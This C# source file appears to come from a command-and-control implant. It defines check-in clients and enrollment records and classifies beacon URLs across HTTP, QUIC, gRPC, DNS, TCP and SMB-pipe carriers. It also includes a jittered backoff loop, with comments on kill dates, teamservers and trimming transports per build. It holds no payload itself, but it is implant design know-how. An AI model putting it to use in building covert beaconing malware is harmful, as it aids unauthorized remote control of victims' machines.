using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

namespace Rod.Implant.Internal;

// The check-in module seam (architecture.md Sec 8): the program's coordinator
// holds the list of compiled-in check-in clients and hands each run to the
// one that serves the egress walk's current URL shape. Which clients a build
// compiles is decided at bake time -- the build unit rewrites
// TransportSelection.cs to name only the modules the baked egress walk can
// dial, and drops the others' source files from the compilation whole -- so
// a web-shaped artifact ships no gRPC client and a pure-stream artifact ships
// no web cycle. The checked-in tree compiles both (dev runs pick per URL
// shape), so developing against either transport needs no build step.

// How a check-in client's run ended for the program's coordinator: terminated
// for good, or yielded because the egress walk's current beacon URL belongs
// to another client -- a web URL (http(s)://) runs the envelope POST cycle,
// a bare host:port runs the mTLS gRPC stream, a quic-schemed URL runs the
// QUIC stream.
internal enum CheckInExit
{
    // The kill date passed or the server refused the handshake permanently.
    Terminate,

    // The walk's current entry is the other client's URL shape; hand over.
    SwitchTransport,
}

/// <summary>
/// One compiled-in check-in client: it either serves the walk's current
/// beacon URL shape or yields, and while it serves it runs the check-in
/// lifecycle until cancellation, the kill date, a permanent refusal, or the
/// walk moving to a shape it does not carry.
/// </summary>
internal interface ICheckInClient
{
    /// <summary>
    /// True when this client carries check-ins for the beacon URL's shape
    /// (a schemed web URL or a bare host:port).
    /// </summary>
    bool Serves(string beaconUrl);

    /// <summary>
    /// Runs the check-in lifecycle until the cancellation token fires, the
    /// kill date passes, the server refuses permanently
    /// (<see cref="CheckInExit.Terminate"/>), or the walk's current entry
    /// takes the other client's URL shape
    /// (<see cref="CheckInExit.SwitchTransport"/>).
    /// </summary>
    Task<CheckInExit> RunAsync(CancellationToken cancellationToken);
}

/// <summary>
/// Everything a check-in client is constructed from: the parsed config (the
/// check-in mode, kill date, verb set, transport profile), the enrollment it
/// checks in under, the enroll bundle a derived child reuses, the egress
/// walk, replay-nonce state, the held-task ledger, and narration log shared
/// by every client covering one run, and the live cadence the clients sleep
/// on -- mutable at run time by the beacon.sleep verb, so every client
/// covering the run retunes together. One record so the generated transport
/// selection can hand each compiled-in client the same setup. The optional
/// enroll connection is the QUIC enroll exchange's live wire: the first
/// session cycle rides it -- the ordinary handshake follows the enroll on
/// the same stream -- and null on every other shape.
/// </summary>
internal sealed record CheckInSetup(
    Config Config,
    Enrollment Enrollment,
    EnrollBundle Enroll,
    EgressEndpoints Egress,
    TaskNonceTracker Nonces,
    HeldTaskLedger Held,
    TextWriter Log,
    Cadence Cadence,
    IAsyncDisposable? EnrollConnection = null);

/// <summary>
/// One enroll dial (architecture.md Sec 8 -- enrollment over QUIC): the
/// inputs the program (or a handler deriving a child) hands the enroll
/// client the baked transport selection names. An http(s) URL runs the JSON
/// enroll cycle; a quic-schemed URL runs the frame exchange on the QUIC
/// module's dial -- the same URL-shape dispatch the check-in clients follow.
/// The transport profile's malleable knobs shape the http body only; over
/// QUIC the exchange is frames under TLS 1.3, so the profile contributes
/// just its request timeout, and ServerCAs is the pinned chain the dial
/// validates against (the QUIC enroll requires one -- it has no system-root
/// fallback).
/// </summary>
internal sealed record EnrollDial(
    string EnrollUrl,
    string StagerToken,
    string? ParentImplantId,
    ECDsa PrivateKey,
    X509Certificate2Collection? ServerCAs,
    TransportProfile Profile,
    string? ImplantClass = null,
    HostIdentity? Host = null,
    string? KillDate = null,
    TextWriter? Log = null)
{
    /// <summary>
    /// Set by the QUIC enroll client on success: the live connection the
    /// exchange rode, so the first session cycle's ordinary handshake can
    /// follow on the same stream (architecture.md Sec 8 -- one connection
    /// carries enroll-then-session). Null on every other shape and on every
    /// refused exchange. Typed as the disposable interface because the
    /// concrete wire belongs to the QUIC module, which may not compile.
    /// </summary>
    public IAsyncDisposable? OpenedConnection { get; set; }
}

/// <summary>
/// The beacon URL shapes (architecture.md Sec 8): a schemed http(s) URL
/// names a web front whose check-in the envelope POST cycle carries; a bare
/// host:port is the mTLS socket the gRPC stream dials; a quic-schemed URL
/// is the QUIC stream's dial; a dns-schemed URL is the DNS carrier's dial
/// -- a resolver and a zone (dns://resolver[:port]/zone); a tcp-schemed
/// URL is the raw socket's dial and an smb-schemed one the named pipe's
/// (smb://host/pipe/name). Shared by the clients and the coordinator, and
/// mirrored by the build unit when it selects which transport modules a
/// build compiles.
/// </summary>
internal static class BeaconUrl
{
    public static bool IsWeb(string beaconUrl)
        => beaconUrl.Trim().StartsWith("http://", StringComparison.OrdinalIgnoreCase)
           || beaconUrl.Trim().StartsWith("https://", StringComparison.OrdinalIgnoreCase);

    public static bool IsQuic(string beaconUrl)
        => beaconUrl.Trim().StartsWith("quic://", StringComparison.OrdinalIgnoreCase);

    public static bool IsSocket(string beaconUrl)
    {
        var trimmed = beaconUrl.Trim();
        return trimmed.StartsWith("tcp://", StringComparison.OrdinalIgnoreCase)
               || trimmed.StartsWith("smb://", StringComparison.OrdinalIgnoreCase);
    }

    public static bool IsDns(string beaconUrl)
    {
        var trimmed = beaconUrl.Trim();
        return trimmed.StartsWith("dns://", StringComparison.OrdinalIgnoreCase)
               || trimmed.StartsWith("doh://", StringComparison.OrdinalIgnoreCase);
    }
}

/// <summary>
/// The check-in cadence shared by every client: the base sleep doubled per
/// consecutive failure (capped), plus-or-minus half the jitter, honoring
/// cancellation. The envelope cycle backs off exactly like the stream, so a
/// down front is walked away from at the same pace whichever client dials it.
/// </summary>
internal static class CheckInCadence
{
    // The failure counter's doubling cap: the reconnect delay grows as
    // base * 2^failures up to 16x, keeping a down teamserver from being polled
    // at beacon rate forever.
    private const int MaxBackoffExponent = 4;

    public static async Task SleepWithJitterAsync(
        TimeSpan sleep,
        TimeSpan jitter,
        int consecutiveFailures,
        CancellationToken cancellationToken)
    {
        var d = sleep;
        for (var i = 0; i < Math.Min(consecutiveFailures, MaxBackoffExponent); i++)
            d += d;
        if (jitter > TimeSpan.Zero)
        {
            var deltaTicks = (long)(Random.Shared.NextDouble() * jitter.Ticks) - jitter.Ticks / 2;
            d = d + TimeSpan.FromTicks(deltaTicks);
        }
        if (d < TimeSpan.Zero)
            d = TimeSpan.Zero;
        await Task.Delay(d, cancellationToken);
    }
}
